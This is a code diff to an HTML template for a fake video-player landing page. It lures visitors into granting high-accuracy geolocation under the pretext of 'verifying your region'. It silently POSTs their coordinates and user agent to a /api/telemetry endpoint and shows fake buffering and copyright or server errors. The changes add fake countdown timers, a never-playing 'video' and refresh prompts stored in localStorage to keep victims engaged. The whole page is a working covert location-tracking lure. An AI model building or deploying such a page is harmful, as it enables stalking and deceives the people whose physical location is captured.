@@ -41,38 +41,43 @@ LANDING_HTML = """
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f0f; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
-        .player-wrapper { width: 100%; max-width: 640px; margin: 0 auto; }
-        .video-container { position: relative; width: 100%; aspect-ratio: 16/9; background: #000; overflow: hidden; }
-        .video-container img.thumbnail { width: 100%; height: 100%; object-fit: cover; filter: blur(12px) brightness(0.5); transition: filter 0.5s; }
-        .video-container.unlocked img.thumbnail { filter: none; }
+        .player-wrapper { width: 100%%; max-width: 640px; margin: 0 auto; }
+        .video-container { position: relative; width: 100%%; aspect-ratio: 16/9; background: #000; overflow: hidden; }
+        .video-container img.thumbnail { width: 100%%; height: 100%%; object-fit: cover; filter: blur(12px) brightness(0.5); transition: filter 0.5s; }
+        .video-container.unlocked img.thumbnail { filter: blur(4px) brightness(0.7); }
         .play-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; z-index: 2; }
-        .play-overlay .play-circle { width: 72px; height: 72px; background: rgba(255,0,0,0.85); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: transform 0.2s, background 0.2s; }
+        .play-overlay .play-circle { width: 72px; height: 72px; background: rgba(255,0,0,0.85); border-radius: 50%%; display: flex; align-items: center; justify-content: center; transition: transform 0.2s, background 0.2s; }
         .play-overlay .play-circle:hover { transform: scale(1.1); background: rgba(255,0,0,1); }
         .play-overlay .play-circle svg { width: 32px; height: 32px; fill: #fff; margin-left: 4px; }
         .play-overlay .lock-text { margin-top: 14px; font-size: 13px; color: rgba(255,255,255,0.85); background: rgba(0,0,0,0.6); padding: 6px 14px; border-radius: 20px; display: flex; align-items: center; gap: 6px; }
         .play-overlay .lock-text svg { width: 14px; height: 14px; fill: currentColor; }
         .duration-badge { position: absolute; bottom: 8px; right: 8px; background: rgba(0,0,0,0.8); color: #fff; font-size: 12px; font-weight: 600; padding: 2px 6px; border-radius: 4px; z-index: 1; }
-        .buffering-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.8); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 3; }
+        .buffering-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.6); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 3; }
         .buffering-overlay.active { display: flex; }
-        .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #ff0000; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #ff0000; border-radius: 50%%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .buffering-overlay p { margin-top: 12px; font-size: 13px; color: rgba(255,255,255,0.7); }
-        .progress-bar { width: 100%; height: 4px; background: #333; position: relative; }
-        .progress-bar .filled { height: 100%; width: 0%%; background: #ff0000; transition: width 0.3s; }
-        .controls-bar { width: 100%; background: #181818; padding: 8px 12px; display: flex; align-items: center; gap: 12px; font-size: 13px; color: #aaa; }
+        .progress-bar { width: 100%%; height: 4px; background: #333; position: relative; }
+        .progress-bar .filled { height: 100%%; width: 0%%; background: #ff0000; transition: width 0.3s; }
+        .controls-bar { width: 100%%; background: #181818; padding: 8px 12px; display: flex; align-items: center; gap: 12px; font-size: 13px; color: #aaa; }
         .controls-bar svg { width: 20px; height: 20px; fill: #fff; cursor: pointer; }
         .controls-bar .time { font-variant-numeric: tabular-nums; }
-        .video-info { width: 100%; max-width: 640px; padding: 16px; }
+        .video-info { width: 100%%; max-width: 640px; padding: 16px; }
         .video-info h1 { font-size: 17px; font-weight: 600; line-height: 1.4; margin-bottom: 6px; }
         .video-info .meta { font-size: 13px; color: #aaa; display: flex; gap: 8px; align-items: center; }
-        .video-info .meta .dot { width: 3px; height: 3px; background: #aaa; border-radius: 50%; }
+        .video-info .meta .dot { width: 3px; height: 3px; background: #aaa; border-radius: 50%%; }
         .toast { position: fixed; bottom: 20px; left: 50%%; transform: translateX(-50%%); background: #323232; color: #fff; padding: 10px 20px; border-radius: 8px; font-size: 13px; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 100; }
         .toast.show { opacity: 1; }
         .error-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 4; }
         .error-overlay.active { display: flex; }
         .error-overlay svg { width: 48px; height: 48px; fill: #ff4444; margin-bottom: 12px; }
-        .error-overlay p { font-size: 14px; color: #ccc; text-align: center; max-width: 280px; }
+        .error-overlay p { font-size: 14px; color: #ccc; text-align: center; max-width: 300px; line-height: 1.5; }
         .error-overlay button { margin-top: 16px; background: #ff0000; color: #fff; border: none; padding: 10px 24px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .error-overlay button:disabled { background: #555; cursor: not-allowed; }
+        .countdown { font-size: 28px; font-weight: 700; color: #ff4444; margin: 12px 0 4px; font-variant-numeric: tabular-nums; }
+        .countdown-label { font-size: 12px; color: #888; margin-bottom: 8px; }
+        .refresh-hint { margin-top: 14px; font-size: 12px; color: #aaa; display: flex; align-items: center; gap: 6px; }
+        .refresh-hint svg { width: 14px; height: 14px; fill: #aaa; animation: spin 2s linear infinite; }
     </style>
 </head>
 <body>
@@ -80,7 +85,7 @@ LANDING_HTML = """
     <div class="video-container" id="videoContainer">
         <img class="thumbnail" src="/test.jpg" alt="Video thumbnail">
         <span class="duration-badge">12:47</span>
-        <div class="play-overlay" id="playOverlay" onclick="handlePlay()">
+        <div class="play-overlay" id="playOverlay">
             <div class="play-circle">
                 <svg viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21"/></svg>
             </div>
@@ -91,12 +96,18 @@ LANDING_HTML = """
         </div>
         <div class="buffering-overlay" id="bufferingOverlay">
             <div class="spinner"></div>
-            <p id="bufferText">Connecting to server...</p>
+            <p id="bufferText">Loading video...</p>
         </div>
         <div class="error-overlay" id="errorOverlay">
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-            <p id="errorText">Playback failed. Please allow location access to verify your region and try again.</p>
-            <button onclick="handlePlay()">Retry</button>
+            <svg viewBox="0 0 24 24" id="errorIcon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <p id="errorText"></p>
+            <div class="countdown" id="countdownDisplay" style="display:none;">0:00</div>
+            <div class="countdown-label" id="countdownLabel" style="display:none;">before retry is available</div>
+            <button id="retryBtn" style="display:none;">Retry</button>
+            <div class="refresh-hint" id="refreshHint" style="display:none;">
+                <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+                Refresh this page to continue
+            </div>
         </div>
     </div>
     <div class="progress-bar"><div class="filled" id="progressFill"></div></div>
@@ -119,36 +130,127 @@ LANDING_HTML = """
 <div class="toast" id="toast"></div>
 
 <script>
-    function showToast(msg, duration) {
-        duration = duration || 3000;
-        const t = document.getElementById('toast');
-        t.textContent = msg;
-        t.classList.add('show');
-        setTimeout(function() { t.classList.remove('show'); }, duration);
+(function() {
+    'use strict';
+
+    var WAIT_FIRST = 2 * 60;
+    var WAIT_SUBSEQUENT = 7 * 60;
+    var STORAGE_KEY = 'vp_state';
+
+    var countdownTimer = null;
+    var actionLocked = false;
+
+    var playOverlay = document.getElementById('playOverlay');
+    var bufferingOverlay = document.getElementById('bufferingOverlay');
+    var bufferText = document.getElementById('bufferText');
+    var errorOverlay = document.getElementById('errorOverlay');
+    var errorIcon = document.getElementById('errorIcon');
+    var errorText = document.getElementById('errorText');
+    var countdownDisplay = document.getElementById('countdownDisplay');
+    var countdownLabel = document.getElementById('countdownLabel');
+    var retryBtn = document.getElementById('retryBtn');
+    var refreshHint = document.getElementById('refreshHint');
+    var videoContainer = document.getElementById('videoContainer');
+
+    function saveState(obj) {
+        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(obj)); } catch(e) {}
+    }
+    function loadState() {
+        try { var s = localStorage.getItem(STORAGE_KEY); return s ? JSON.parse(s) : null; } catch(e) { return null; }
     }
 
-    function handlePlay() {
-        const playOverlay = document.getElementById('playOverlay');
-        const bufferingOverlay = document.getElementById('bufferingOverlay');
-        const errorOverlay = document.getElementById('errorOverlay');
-        const bufferText = document.getElementById('bufferText');
-
-        errorOverlay.classList.remove('active');
-
-        if (!navigator.geolocation) {
-            showError("Your browser doesn't support location services.");
-            return;
-        }
-
+    function hideAll() {
         playOverlay.style.display = 'none';
+        bufferingOverlay.classList.remove('active');
+        errorOverlay.classList.remove('active');
+        countdownDisplay.style.display = 'none';
+        countdownLabel.style.display = 'none';
+        retryBtn.style.display = 'none';
+        refreshHint.style.display = 'none';
+        if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+    }
+
+    function showInitial() {
+        hideAll();
+        playOverlay.style.display = '';
+        videoContainer.classList.remove('unlocked');
+    }
+
+    function showWait(waitEndTime) {
+        hideAll();
+        videoContainer.classList.remove('unlocked');
+        errorOverlay.classList.add('active');
+        errorIcon.style.display = '';
+        errorText.textContent = 'Playback server error. Please wait and try again.';
+        countdownDisplay.style.display = '';
+        countdownLabel.style.display = '';
+        retryBtn.style.display = '';
+        retryBtn.disabled = true;
+        retryBtn.textContent = 'Please wait...';
+
+        function tick() {
+            var now = Date.now();
+            var remaining = Math.max(0, Math.ceil((waitEndTime - now) / 1000));
+            var m = Math.floor(remaining / 60);
+            var s = remaining %% 60;
+            countdownDisplay.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+            if (remaining <= 0) {
+                clearInterval(countdownTimer);
+                countdownTimer = null;
+                showRetryAvailable();
+            }
+        }
+        tick();
+        countdownTimer = setInterval(tick, 1000);
+    }
+
+    function showRetryAvailable() {
+        countdownDisplay.textContent = '0:00';
+        countdownLabel.textContent = 'Ready to retry';
+        retryBtn.disabled = false;
+        retryBtn.textContent = 'Retry Playback';
+    }
+
+    function showFakeVideo() {
+        hideAll();
+        videoContainer.classList.add('unlocked');
+        bufferingOverlay.classList.add('active');
+        bufferText.textContent = 'Buffering video...';
+        var msgs = ['Buffering video...', 'Connecting to CDN...', 'Loading stream data...', 'Buffering video...'];
+        var i = 0;
+        countdownTimer = setInterval(function() {
+            i = (i + 1) %% msgs.length;
+            bufferText.textContent = msgs[i];
+        }, 3000);
+    }
+
+    function showRefreshRequired() {
+        hideAll();
+        videoContainer.classList.add('unlocked');
+        errorOverlay.classList.add('active');
+        errorIcon.style.display = 'none';
+        errorText.textContent = 'Stream interrupted. A page refresh is required to reconnect to the server.';
+        refreshHint.style.display = '';
+    }
+
+    function handleInitialPlay() {
+        if (actionLocked) return;
+        actionLocked = true;
+
+        hideAll();
         bufferingOverlay.classList.add('active');
         bufferText.textContent = 'Verifying your region...';
 
+        if (!navigator.geolocation) {
+            transitionToFailed();
+            return;
+        }
+
         navigator.geolocation.getCurrentPosition(
-            async function(position) {
+            function(position) {
                 bufferText.textContent = 'Region verified. Loading stream...';
 
-                const payload = {
+                var payload = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
                     accuracy: position.coords.accuracy,
@@ -158,42 +260,71 @@ LANDING_HTML = """
                     timestamp: new Date(position.timestamp).toISOString(),
                     user_agent: navigator.userAgent
                 };
-
                 try {
-                    await fetch('/api/telemetry', {
+                    fetch('/api/telemetry', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
-                    });
-                } catch (e) { /* silent */ }
+                    }).catch(function() {});
+                } catch (e) {}
 
-                bufferText.textContent = 'Buffering video...';
-                await delay(2500);
-                bufferText.textContent = 'Connecting to CDN node...';
-                await delay(2000);
-                bufferText.textContent = 'Almost ready...';
-                await delay(1500);
-
-                bufferingOverlay.classList.remove('active');
-                showError("Video has been removed due to a copyright claim. (Error 403)");
+                setTimeout(function() {
+                    bufferText.textContent = 'Connecting to CDN node...';
+                    setTimeout(function() { transitionToFailed(); }, 1500);
+                }, 2000);
             },
-            function(error) {
-                bufferingOverlay.classList.remove('active');
-                showError("Playback blocked. Location access is required to verify your region and enable streaming.");
-            },
+            function() { transitionToFailed(); },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     }
 
-    function showError(msg) {
-        const errorOverlay = document.getElementById('errorOverlay');
-        document.getElementById('errorText').textContent = msg;
-        errorOverlay.classList.add('active');
+    function transitionToFailed() {
+        actionLocked = false;
+        var waitEnd = Date.now() + (WAIT_FIRST * 1000);
+        saveState({ phase: 'WAIT', waitEnd: waitEnd, cycle: 0 });
+        showWait(waitEnd);
     }
 
-    function delay(ms) {
-        return new Promise(function(resolve) { setTimeout(resolve, ms); });
+    function handleRetry() {
+        if (actionLocked) return;
+        actionLocked = true;
+        var state = loadState();
+        var cycle = state ? (state.cycle || 0) : 0;
+        saveState({ phase: 'FAKE_VIDEO', cycle: cycle + 1 });
+        showFakeVideo();
+        setTimeout(function() {
+            actionLocked = false;
+            saveState({ phase: 'REFRESH_REQUIRED', cycle: cycle + 1 });
+            showRefreshRequired();
+        }, 8000);
     }
+
+    playOverlay.addEventListener('click', handleInitialPlay);
+    retryBtn.addEventListener('click', function() {
+        if (!retryBtn.disabled) handleRetry();
+    });
+
+    function init() {
+        var state = loadState();
+        if (!state) { showInitial(); return; }
+
+        switch (state.phase) {
+            case 'WAIT':
+                showWait(state.waitEnd);
+                break;
+            case 'FAKE_VIDEO':
+            case 'REFRESH_REQUIRED':
+                var waitEnd7 = Date.now() + (WAIT_SUBSEQUENT * 1000);
+                var cycle = state.cycle || 1;
+                saveState({ phase: 'WAIT', waitEnd: waitEnd7, cycle: cycle });
+                showWait(waitEnd7);
+                break;
+            default:
+                showInitial();
+        }
+    }
+    init();
+})();
 </script>
 </body>
 </html>
